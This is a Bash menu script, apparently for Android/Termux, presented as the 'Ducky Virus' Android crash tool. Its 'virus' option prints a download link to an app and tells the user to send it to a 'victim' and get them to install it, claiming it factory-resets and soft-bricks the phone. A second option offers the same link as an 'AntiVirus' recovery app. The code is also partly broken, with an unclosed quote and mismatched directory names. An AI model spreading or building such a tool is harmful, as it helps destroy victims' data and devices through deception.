# Redistributions and Modifications are allowed with credits.

# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------

# scripting start
banner(){
echo -e '\e[93m               
                    ██████████                                  
                  ██░░░░░░░░░░██                                
                ██░░░░░░░░░░░░░░██                              
                ██░░░░░░░░████░░██████████                      
    ██          ██░░░░░░░░████░░██▒▒▒▒▒▒██                      
  ██░░██        ██░░░░░░░░░░░░░░██▒▒▒▒▒▒██                      
  ██░░░░██      ██░░░░░░░░░░░░░░████████                        
  ██░░░░░░██      ██░░░░░░░░░░░░██                              
██░░░░░░░░████████████░░░░░░░░██                                
██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██                              
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                            
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                           
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██                              
██░░░░░░░░░░░░░░░░░░░░░░░░░░██                                
  ██████░░░░░░░░░░░░░░░░████                                  
        ████████████████                                      

'
echo " " 
echo -e "$red #$pink Ducky Virus$grn $red#$rset"
echo

# Functions
echo -e "$red #$pink[Android Crash Tool] $red#$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
                    ██████████
                  ██░░░░░░░░░░██
                ██░░░░░░░░░░░░░░██
                ██░░░░░░░░████░░██████████
    ██          ██░░░░░░░░████░░██▒▒▒▒▒▒██
  ██░░██        ██░░░░░░░░░░░░░░██▒▒▒▒▒▒██
  ██░░░░██      ██░░░░░░░░░░░░░░████████
  ██░░░░░░██      ██░░░░░░░░░░░░██
██░░░░░░░░████████████░░░░░░░░██
██░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██████░░░░░░░░░░░░░░░░████
        ████████████████
'
echo " "
echo -e "$red #$pink Ducky Virus$grn $red#$rset"
echo
# Functions
echo -e "$red #$pink[Android Crash Tool] $red#$rset"
echo " "
echo " "
}
menu(){
echo -e "$red #$ylo [Choose Option] $red #$rset"
echo " "
echo " "
echo -e "$red #$cyan [\e[93m1\e[96m] Ducky Virus 1"
echo -e "$red #$cyan [\e[93m2\e[96m] Ducky Virus 2(for Android 10 and above)"
echo -e "$red #$cyan [\e[93m3\e[96m] About"
echo -e "$red #$cyan [\e[93m4\e[96m] Join me"
echo -e "$red #$cyan [\e[93m5\e[96m] Exit"
echo " "
echo " "
echo -e "$red #$ylo [Select] $red #$rset"
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
am start -a android.intent.action.VIEW -d https://krish.l5.ca/ > /dev/null 2>&1
banner
menu
elif [ $optnz = "5" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 

        ____             __            _    ___                
       / __ \__  _______/ /____  __   | |  / (_)______  _______
      / / / / / / / ___/ //_/ / / /   | | / / / ___/ / / / ___/
     / /_/ / /_/ / /__/ ,< / /_/ /    | |/ / / /  / /_/ (__  ) 
    /_____/\__,_/\___/_/|_|\__, /     |___/_/_/   \__,_/____/  
                          /____/                                   

'

echo " "
echo -e "\e[91m Copy below link and paste in any browser and download virus app, send  to your victim and ask him to install and execute it 
in the device. The device will be pushed to hard factory reset and tries to soft brick itself.
                                👇👇👇

         \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[91m

                                 👆👆👆
"
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e  '\e[92m 

        ____             __            _    ___                
       / __ \__  _______/ /____  __   | |  / (_)______  _______
      / / / / / / / ___/ //_/ / / /   | | / / / ___/ / / / ___/
     / /_/ / /_/ / /__/ ,< / /_/ /    | |/ / / /  / /_/ (__  ) 
    /_____/\__,_/\___/_/|_|\__, /     |___/_/_/   \__,_/____/  
                          /____/                                   

echo " "
echo " "
echo -e "\e[91m Copy below link and paste in any browser and download the AntiVirus app, download and execute it in the bricked device to recover the subject.
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://dlsharefile.com/file/1429135210\e[93m

                    👆👆👆
"
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
   ||  ||  
    \\()// 
  //(__)\\
  ||    ||
'
echo -e "\e[93m             Visit the GitHub to contribute: https://github.com/OfficialBlackMamba" | pv -qL 10
echo -e "\e[93m             Website: https://krish.l5.ca/" | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/HXP-Ducky" ];
then
cd $HOME
rm -rf HXP-Ducky
elif [ -d "$HOME/HXP-Ducky" ];
then
cd $HOME
rm -rf HXP-Ducky
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATING, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/krishealty/ducky-virus 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (version 2.39.2992)..!\e[0m"
sleep 2.0
cd $HOME
cd HXP-Duck
main.sh
}
banner
menu
